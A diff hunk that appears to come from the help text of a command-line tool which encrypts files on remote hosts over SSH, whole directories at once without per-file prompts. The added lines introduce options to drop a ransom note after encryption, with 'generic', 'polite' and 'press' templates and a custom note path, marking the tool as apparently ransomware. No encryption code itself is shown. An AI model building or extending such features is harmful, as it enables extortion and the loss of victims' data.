@@ -61,6 +61,8 @@ REMOTE (streamed over ssh, no agent needed):
   --timeout <seconds>      SSH operation timeout (default: 120)
   --local-in               -i is a local path even with --host
   --local-out              -o is a local path even with --host
+  --drop-note <template>   After success, drop ransom note (generic/polite/press)
+  --note-out <path>        Custom ransom-note location
 AUTOMATION (engages as soon as the connection is up):
   give -i/--input-file a DIRECTORY (local or remote) instead of a
   file: every file inside is encrypted in one pass, no per-file prompt.
